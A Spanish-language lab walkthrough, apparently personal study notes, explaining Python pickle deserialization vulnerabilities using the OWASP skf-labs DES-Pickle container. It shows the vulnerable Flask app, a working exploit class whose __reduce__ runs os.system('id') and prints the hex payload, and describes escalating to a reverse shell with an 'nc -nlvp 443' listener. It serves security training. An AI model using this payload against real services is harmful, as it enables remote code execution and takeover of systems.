----
- Tags: #deserializacion #pickle
----
# Definición

> Un Ataque de **Deserialización Pickle** (**DES-Pickle**) es un tipo de vulnerabilidad que puede ocurrir en aplicaciones Python que usan la biblioteca Pickle para serializar y deserializar objetos.

**`pickle`** es un módulo en Python que se utiliza para **serializar y deserializar** objetos de Python. La **serialización** es el proceso de convertir un objeto de Python en una secuencia de bytes que se puede almacenar en un archivo o transmitir a través de una red, y luego la **deserialización** es el proceso inverso, donde esos bytes se convierten de nuevo en el objeto original.

- **Conceptos clave**

	- **Serialización (pickling)**: Convertir un objeto de Python (como listas, diccionarios, clases, etc.) en una secuencia de bytes que se puede almacenar o enviar.
	- **Deserialización (unpickling)**: Convertir esa secuencia de bytes nuevamente en un objeto de Python.

La vulnerabilidad se produce cuando un atacante es capaz de controlar la entrada Pickle que se pasa a una función de deserialización en la aplicación. Si el código de la aplicación no valida adecuadamente la entrada Pickle, puede permitir que un atacante inyecte código malicioso en el objeto deserializado.

Una vez que el objeto ha sido deserializado, el código malicioso puede ser ejecutado en el contexto de la aplicación, lo que puede permitir al atacante tomar el control del sistema, acceder a datos sensibles, o incluso ejecutar código remoto.

Los atacantes pueden aprovecharse de las vulnerabilidades de DES-Pickle para realizar ataques de denegación de servicio (DoS), inyectar código malicioso, o incluso tomar el control completo del sistema.

El impacto de un Ataque de Deserialización Pickle depende del tipo y la sensibilidad de los datos que se puedan obtener, pero puede ser muy grave. Por lo tanto, es importante que los desarrolladores de aplicaciones Python validen y filtren de forma adecuada la entrada Pickle que se pasa a las funciones de deserialización, y que utilicen técnicas de seguridad como la limitación de recursos para prevenir ataques DoS y la desactivación de la deserialización automática de objetos no confiables.

------
# Explotación de DES-Pickle en laboratorio

Montaremos nuestro laboratorio nuevamente desde **skf-labs**

- ``docker pull blabla1337/owasp-skf-lab:des-pickle``
- ``docker run -dit -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:des-pickle``

--------

Entremos al http://localhost:5000 para ingresar al servicio. La web se verá de la siguiente manera

![[pickle 1.png]]

Por detrás esta web está empleando **Pickle**, lo que podemos hacer para de forma orientativa entender como es que funciona todo, **mirar el código** a través de la ruta de **skf-labs** ``skf-labs/py/DES-Pickle``.

```python
import pickle
from flask import Flask, request, render_template

app = Flask(__name__, static_url_path='/static', static_folder='static')
app.config['DEBUG'] = True


@app.route("/")
def start():
        user = {'name': 'ZeroCool'}
        with open('filename.pickle', 'wb') as handle:
            pickle.dump(user, handle, protocol=pickle.HIGHEST_PROTOCOL)
        with open('filename.pickle', 'rb') as handle:
            a = pickle.load(handle)
        return render_template("index.html", content = a)


@app.route("/sync", methods=['POST'])
def deserialization():
        with open("pickle.hacker", "wb+") as file:
            att = request.form['data_obj'] # "data_obj" es lo que enviamos nosotros en la web a la hora de escribir algo en la entrada.
            attack = bytes.fromhex(att) # Acá transforma el objeto en formato Bytes, pero unicamente a cadenas en Hexadecimal, por lo tanto necesitamos poner una cadena en Hex para efectuar el ataque.
            file.write(attack)
            file.close()
        with open('pickle.hacker', 'rb') as handle:
            a = pickle.load(handle) # Utiliza un recurso similar al que se usa en Yaml, llamado "picke.load()".
            print(attack)
            return render_template("index.html", content = a)

@app.errorhandler(404)
def page_not_found(e):
    return render_template("404.html")


if __name__ == "__main__":
    app.run(host='0.0.0.0')
```

Como podemos ver al usar ``pickle.load()`` sin ningún tipo de sanitización, ya que se confía plenamente en el input del usuario.

----

Para realizar el ataque crearemos un archivo **data.py** y le colocaremos lo siguiente.

```python
import pickle
import os
import binascii

class Exploit(object): # Creamos una clase
    def __reduce__(self): # Creamos la función reduce
        return(os.system,('id',)) # Internamente le indicamos que es lo que tiene que retornar

if __name__ == '__main__':
    print(binascii.hexlify(pickle.dumps(Exploit()))) # Mostrar por consola toda la data serializada del "id" en Hexadecimal.
```

![[pickle 2.png]]

Cuando esta cadena la coloquemos en el panel de entrada de la web y se interprete la misma se encargará de deserializarla.

![[pickle 3.png]]

Acá como podemos ver nos devuelve un "**0**" y no el output del comando ``id`` que colocamos, esto se debe a que ese cero hace referencia al **código de estado exitoso(0)** que dio el comando al ser **ejecutado**. Por lo tanto nosotros como atacantes podríamos intentar entablar una **Reverse Shell** directamente, dejando el código de la siguiente manera.

![[pickle 4.png]]

Solo quedaría ponernos en escucha con ``nc -nlvp 443`` y **mandar** la cadena en **Hexadecimal** a través de la web.

![[pickle 5.png]]

Tenemos acceso a la máquina victima.